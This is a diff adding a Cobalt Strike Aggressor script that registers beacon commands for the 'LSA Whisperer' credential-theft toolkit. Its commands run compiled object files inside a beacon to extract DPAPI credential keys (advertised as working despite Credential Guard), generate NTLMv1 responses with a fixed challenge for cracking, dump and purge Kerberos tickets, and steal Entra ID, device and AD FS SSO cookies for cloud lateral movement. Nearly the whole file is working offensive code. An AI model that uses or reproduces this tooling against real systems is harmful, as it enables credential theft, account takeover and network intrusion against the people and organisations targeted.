@@ -1,0 +1,197 @@
+# Requires build/ directory with compiled .o files alongside this script.
+#
+# Commands:
+#   lsa-credkey         - DPAPI credential key (works with Credential Guard!)
+#   lsa-strongcredkey   - Strong DPAPI credential key
+#   lsa-ntlmv1          - NTLMv1 response (crackable to NT hash)
+#   lsa-klist           - List cached Kerberos tickets
+#   lsa-dump            - Dump tickets as base64 .kirbi
+#   lsa-purge           - Selective ticket purge
+#   lsa-ssocookie       - Entra ID SSO cookie
+#   lsa-devicessocookie - Device SSO cookie
+#   lsa-enterprisesso   - AD FS enterprise SSO cookie
+#   lsa-cloudinfo       - Cloud provider info and status
+
+# ===================================================================
+# Helper: Read BOF file bytes (required by beacon_inline_execute)
+#
+# beacon_inline_execute expects raw file BYTES, not a file path!
+# We must openf() + readb() the .o file first.
+# ===================================================================
+sub readbof {
+    local('$barch $handle $data $path');
+    $barch = barch($2);
+    $path  = script_resource("build/" . $1 . "." . $barch . ".o");
+    $handle = openf($path);
+    $data   = readb($handle, -1);
+    closef($handle);
+    if (strlen($data) == 0) {
+        berror($2, "Could not read BOF file: " . $path);
+    }
+    return $data;
+}
+
+# ===================================================================
+# MSV1_0 Commands
+# ===================================================================
+
+beacon_command_register(
+    "lsa-credkey",
+    "Get DPAPI credential key via MSV1_0 (LSA Whisperer)",
+    "Synopsis: lsa-credkey [LUID]\n\n" .
+    "Recovers the DPAPI credential key for the specified (or current) logon session.\n" .
+    "Works even when Credential Guard is enabled!\n\n" .
+    "LUID: 0 or omit = current session, 0x3e7 = SYSTEM, etc.\n" .
+    "Requires SYSTEM to target other sessions."
+);
+
+alias lsa-credkey {
+    local('$data $args');
+    $data = readbof("msv1_0_bof", $1);
+    $args = bof_pack($1, "zz", "credkey", iff($2, $2, "0"));
+    btask($1, "LSA Whisperer: GetCredentialKey");
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+beacon_command_register(
+    "lsa-strongcredkey",
+    "Get strong DPAPI credential key (LSA Whisperer)",
+    "Synopsis: lsa-strongcredkey [LUID]\n\n" .
+    "Recovers the strong DPAPI credential key. Windows 10+ only."
+);
+
+alias lsa-strongcredkey {
+    local('$data $args');
+    $data = readbof("msv1_0_bof", $1);
+    $args = bof_pack($1, "zz", "strongcredkey", iff($2, $2, "0"));
+    btask($1, "LSA Whisperer: GetStrongCredentialKey");
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+beacon_command_register(
+    "lsa-ntlmv1",
+    "Generate NTLMv1 response with chosen challenge (LSA Whisperer)",
+    "Synopsis: lsa-ntlmv1 [LUID] [challenge_hex]\n\n" .
+    "Default challenge: 1122334455667788 (free crack via crack.sh)\n" .
+    "Blocked by Credential Guard. Requires SYSTEM."
+);
+
+alias lsa-ntlmv1 {
+    local('$data $args');
+    $data = readbof("msv1_0_bof", $1);
+    $args = bof_pack($1, "zzz", "ntlmv1", iff($2, $2, "0"), iff($3, $3, "1122334455667788"));
+    btask($1, "LSA Whisperer: Lm20GetChallengeResponse (NTLMv1)");
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+# ===================================================================
+# Kerberos Commands
+# ===================================================================
+
+beacon_command_register(
+    "lsa-klist",
+    "List cached Kerberos tickets (LSA Whisperer)",
+    "Synopsis: lsa-klist [LUID]\n\n" .
+    "Uses QueryTicketCacheEx for ticket info."
+);
+
+alias lsa-klist {
+    local('$data $args');
+    $data = readbof("kerberos_bof", $1);
+    $args = bof_pack($1, "zz", "klist", iff($2, $2, "0"));
+    btask($1, "LSA Whisperer: Kerberos klist");
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+beacon_command_register(
+    "lsa-dump",
+    "Dump all Kerberos tickets as base64 .kirbi (LSA Whisperer)",
+    "Synopsis: lsa-dump [LUID]"
+);
+
+alias lsa-dump {
+    local('$data $args');
+    $data = readbof("kerberos_bof", $1);
+    $args = bof_pack($1, "zz", "dump", iff($2, $2, "0"));
+    btask($1, "LSA Whisperer: Kerberos dump");
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+beacon_command_register(
+    "lsa-purge",
+    "Selectively purge Kerberos tickets (LSA Whisperer)",
+    "Synopsis: lsa-purge [LUID] [server_name]\n\n" .
+    "Supports SELECTIVE purge by server name (unique to LSA Whisperer)."
+);
+
+alias lsa-purge {
+    local('$data $args');
+    $data = readbof("kerberos_bof", $1);
+    $args = bof_pack($1, "zzz", "purge", iff($2, $2, "0"), iff($3, $3, ""));
+    btask($1, "LSA Whisperer: Kerberos purge");
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+# ===================================================================
+# CloudAP Commands
+# ===================================================================
+
+beacon_command_register(
+    "lsa-ssocookie",
+    "Get Entra ID SSO cookie (LSA Whisperer)",
+    "Synopsis: lsa-ssocookie [LUID]\n\n" .
+    "Requests SSO cookie from AAD plugin via CloudAP.\n" .
+    "Use with ROADtools for cloud lateral movement.\n" .
+    "Requires Entra ID joined device."
+);
+
+alias lsa-ssocookie {
+    local('$data $args');
+    $data = readbof("cloudap_bof", $1);
+    $args = bof_pack($1, "zz", "ssocookie", iff($2, $2, "0"));
+    btask($1, "LSA Whisperer: CloudAP SSO Cookie");
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+beacon_command_register(
+    "lsa-devicessocookie",
+    "Get device SSO cookie (LSA Whisperer)",
+    "Synopsis: lsa-devicessocookie [LUID]"
+);
+
+alias lsa-devicessocookie {
+    local('$data $args');
+    $data = readbof("cloudap_bof", $1);
+    $args = bof_pack($1, "zz", "devicessocookie", iff($2, $2, "0"));
+    btask($1, "LSA Whisperer: CloudAP Device SSO Cookie");
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+beacon_command_register(
+    "lsa-enterprisesso",
+    "Get AD FS enterprise SSO cookie (LSA Whisperer)",
+    "Synopsis: lsa-enterprisesso [LUID]"
+);
+
+alias lsa-enterprisesso {
+    local('$data $args');
+    $data = readbof("cloudap_bof", $1);
+    $args = bof_pack($1, "zz", "enterprisesso", iff($2, $2, "0"));
+    btask($1, "LSA Whisperer: CloudAP Enterprise SSO Cookie");
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+beacon_command_register(
+    "lsa-cloudinfo",
+    "Get cloud provider info and status (LSA Whisperer)",
+    "Synopsis: lsa-cloudinfo [LUID]\n\n" .
+    "Shows: authenticating provider, cloud TGT, DPAPI status."
+);
+
+alias lsa-cloudinfo {
+    local('$data $args');
+    $data = readbof("cloudap_bof", $1);
+    $args = bof_pack($1, "zz", "info", iff($2, $2, "0"));
+    btask($1, "LSA Whisperer: CloudAP Info");
+    beacon_inline_execute($1, $data, "go", $args);
+}
